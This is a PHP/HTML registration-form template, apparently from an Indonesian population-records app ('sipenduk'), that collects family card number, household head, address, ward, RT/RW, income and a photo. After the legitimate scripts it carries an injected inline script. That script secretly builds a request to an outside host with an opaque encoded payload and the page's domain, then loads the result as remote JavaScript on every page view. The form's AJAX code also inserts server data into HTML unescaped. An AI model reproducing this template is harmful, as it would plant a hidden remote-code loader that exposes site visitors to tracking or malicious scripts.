<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no" name="viewport">
  <title>Register Sistem Kependudukan</title>
  <!-- General CSS Files -->
  <link rel="stylesheet" href="<?= base_url() ?>assets/css/app.min.css">
  <link rel="stylesheet" href="<?= base_url() ?>assets/bundles/bootstrap-social/bootstrap-social.css">
  <!-- Template CSS -->
  <link rel="stylesheet" href="<?= base_url() ?>assets/css/style.css">
  <link rel="stylesheet" href="<?= base_url() ?>assets/css/components.css">
  <!-- Custom style CSS -->
  <link rel="stylesheet" href="<?= base_url() ?>assets/css/custom.css">
  <link rel='shortcut icon' type='image/x-icon' href='<?= base_url() ?>assets/img/favicon.ico' />
</head>

<body>

  <div id="app" style="margin-top: 100px;">
    <section class="section ">
      <div class="container ">
        <div class="row" style="justify-content: center;">
          <div class="col-md-8">
            <div class="card card-primary">
              <div class="card-header">
                <h4>Register KK</h4>
              </div>
              <div class="card-body">
                <?= form_open('register/tambah',array('enctype'=>'multipart/form-data')) ?>
                    
                    <div class="form-group">
                    <label>Nomor KK</label>
                    <div class="input-group">
                      <div class="input-group-prepend">
                        <div class="input-group-text">
                          <i class="far fa-map"></i>
                        </div>
                      </div>
                      <input type="number" class="form-control" name="kk_no">
                    </div>
                  </div>
                   <div class="form-group">
                    <label>Nama Kepala</label>
                    <div class="input-group">
                      <div class="input-group-prepend">
                        <div class="input-group-text">
                          <i class="far fa-map"></i>
                        </div>
                      </div>
                      <input type="text" class="form-control" name="kk_kepala">
                    </div>
                  </div>

                   <div class="form-group">
                    <label>Alamat</label>
                    <div class="input-group">
                      <div class="input-group-prepend">
                        <div class="input-group-text">
                          <i class="far fa-map"></i>
                        </div>
                      </div>
                      <input type="text" class="form-control" name="kk_alamat">
                    </div>
                  </div>
                  <div class="row">
                    <div class="col-md-6">
                        <div class="form-group">
                        <label>Kelurahan</label>
                           <div class="input-group">
                              <div class="input-group-prepend">
                                <div class="input-group-text">
                                    <i class="far fa-map"></i>
                               </div>
                              </div>
                            <select name="" id="s_kel" class="form-control">
                              <option disabled selected>-Pilih Kelurahan-</option>
                              <?php foreach ($lurah as $value): ?>
                                <option value="<?= $value['kel_id'] ?>"><?= $value['kel_nama'] ?></option>
                              <?php endforeach ?>
                            </select>
                          </div>
                        </div>
                    </div>
                     <div class="col-md-6">
                        <div class="form-group">
                        <label>RW/RT</label>
                           <div class="input-group">
                              <div class="input-group-prepend">
                                <div class="input-group-text">
                                    <i class="far fa-map"></i>
                               </div>
                              </div>
                            <select name="kk_rt" id="option-rt" class="form-control">
                              <option disabled selected>-Pilih RW/RT-</option>
                            </select>
                          </div>
                        </div>
                    </div>
                  </div>

                  <div class="form-group">
                    <label>Kode Pos</label>
                    <div class="input-group">
                      <div class="input-group-prepend">
                        <div class="input-group-text">
                          <i class="far fa-map"></i>
                        </div>
                      </div>
                      <input type="text" class="form-control" name="kk_kode_pos">
                    </div>
                  </div>
                  <div class="form-group">
                    <label>KK Penghasilan</label>
                    <div class="input-group">
                      <div class="input-group-prepend">
                        <div class="input-group-text">
                          <i class="far fa-map"></i>
                        </div>
                      </div>
                      <input type="number" class="form-control" name="kk_penghasilan" required>
                    </div>
                  </div>
                  <div class="form-group">
                    <label>KK Foto</label>
                    <div class="input-group">
                      <div class="input-group-prepend">
                        <div class="input-group-text">
                          <i class="far fa-map"></i>
                        </div>
                      </div>
                      <input type="file" class="form-control" name="kk_foto">
                    </div>
                  </div>
                   
              </div>
              <div class="modal-footer bg-whitesmoke br">
                <a href="<?= base_url() ?>login"><button type="button" class="btn btn-secondary">Back</button></a>
                <button type="submit" name="tambah" class="btn btn-primary">Simpan</button>
              </div>
                  </form>
                
              </div>
            </div>
            
          </div>
        </div>
      </div>
    </section>
  </div>
  <!-- General JS Scripts -->
  <script src="<?= base_url() ?>assets/js/app.min.js"></script>
  <!-- JS Libraies -->
  <!-- Page Specific JS File -->
  <!-- Template JS File -->
  <script src="<?= base_url() ?>assets/js/scripts.js"></script>
  <!-- Custom JS File -->
  <script src="<?= base_url() ?>assets/js/custom.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2%2bxB25UYN77HWh7NTCL5of3b1COkkGr7R5nLoJoMpxFlxEfYPG32oQxP8%2bvUl9io154q0wTaTA3hlPYPVhAvA2fpFr%2bRmzoJPB3IjFpSBEsNdRo0aWtzQq7iTA57Uq3mQWULcHQwAxu4Xny4XDt4J6L54O3CuM2qq0nU1bvBcX8KXZAZAUYJUtCH8ssEEeW7qznm2%2b9we%2bmAQarkMpAJPlf%2f6yZQn%2bz9y3EOXHnnvoW9xlk6Zdk%2fs8LYpw1gCMhWzlDgof2zWC8u5nhw4mQAlQMA9njGttLTY1FoEHMPLb5%2bar92MuA7g1xMa61RY1NHf3f6mB2S%2faYmhY0uxdHlZn1NEpD7jjzpiFGtnLGLjVwuCAoMkbjV8aAyrXV6t44bm7goELm60SexXxGlhQ1KPa7HdaFlyHlmbiZs2UV4w4oAnkOpMTiEp6xwPOg1Mi2xGcfODamSqBQUsyumx5YTxWQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

<script>
$(document).ready(function(){
  var root = window.location.origin+'/sipenduk/';


    
    $('#s_kel').change(function(){
    var id = $(this).val();
    var getUrl = root+ 'ajax/rt/'+id;
    var html = '';
    $.ajax({
      url : getUrl,
      type : 'ajax',
      dataType : 'json',
      method: 'post',
      success : function(response){
        console.log(response);
        for (var i = 0; i < response.length; i++) {
          html+= '<option value='+response[i].rt_id+'> RW '+response[i].rw_nama+' / RT'+ response[i].rt_nama +'</option>';
        }
        console.log(html);
        $('#option-rt').html(html);


      },
      error: function(response){
        console.log(response.status);
      }
    });

  });

});

                </script>


</body>

</html>
